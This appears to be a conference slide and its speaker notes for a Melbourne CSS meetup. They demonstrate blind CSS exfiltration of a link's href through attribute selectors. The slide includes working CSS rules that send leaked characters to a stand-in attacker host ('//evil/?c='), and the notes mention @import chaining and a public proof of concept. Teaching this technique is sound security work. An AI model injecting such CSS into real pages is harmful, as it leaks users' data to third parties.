DEMO · stealing a link from melbcss.com

Leaking an href with nothing but selectors

the target on the page

<a class="link-button"
  href="https://github.com/melbcssmeetup">
  Follow on GitHub
</a>

the attacker's CSS (theme / injection)

a.link-button[href^="…/a"]{background:url(//evil/?c=a)}
a.link-button[href^="…/l"]{background:url(//evil/?c=l)}
a.link-button[href^="…/m"]{background:url(//evil/?c=m)} ← matches

Only the matching rule fetches its background — so the attacker's server learns the next character. Extend the known prefix, repeat: m → me → mel → … → melbcssmeetup.

CSS can't loop, so it's one char per round — or chain @imports to do it in one shot. Blind CSS exfiltration, PortSwigger has the full PoC.

Concrete demo tied to their own site — very effective. Walk it slowly: each rule says "if the href starts with this prefix, fetch my background image." Only the rule whose next character is correct generates a box with a background, so only it hits the attacker's server, revealing that character. You then re-inject with the prefix extended by the known char and recover the next one. Be honest about the caveat on the last line: pure CSS has no loop, so naively it's one network round per character; real attacks use recursive @import chaining (Pepe Vila / PortSwigger "Blind CSS Exfiltration") to pull many characters per load. This needs attacker-controlled CSS on the page — e.g. a malicious community theme. Offer to show the live PortSwigger PoC repo in Q&A. ~70 seconds.
